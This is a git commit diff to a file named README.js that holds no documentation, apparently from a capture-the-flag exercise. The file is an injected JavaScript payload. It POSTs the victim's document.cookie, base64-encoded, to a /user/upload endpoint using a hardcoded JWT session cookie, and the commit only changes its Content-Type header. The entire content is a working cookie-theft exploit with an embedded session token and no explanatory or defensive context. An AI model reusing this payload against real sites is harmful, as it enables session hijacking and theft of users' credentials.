4e9743bc32b9df3d41e6708c0373b62e7d5482be
arang <jaewook376@naver.com>
2023-06-01 20:01:36 +0900

    Update README.js

--- README.js
+++ README.js
@@ -1,7 +1,7 @@
 fetch("/user/upload", {
   method: "POST",
   headers: {
-    "Content-Type": "text/plain",
+    "Content-Type": "application/x-www-form-urlencoded",
     "Cookie": "dream-token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTY4NTYxNjkyNywianRpIjoiMWQ4NTEyN2QtM2Y5Ny00NWNiLWFlNGUtZmY1ODIzNWQ1MDEzIiwibmJmIjoxNjg1NjE2OTI3LCJ0eXBlIjoiYWNjZXNzIiwic3ViIjoyLCJleHAiOjE2ODU2MTc4Mjd9.GPwFvuv1mL7H6MB3zbUG38CLjIUe0szON63bcVQSJzA"
   },
   body: "filename=asdf&data="+btoa(document.cookie),
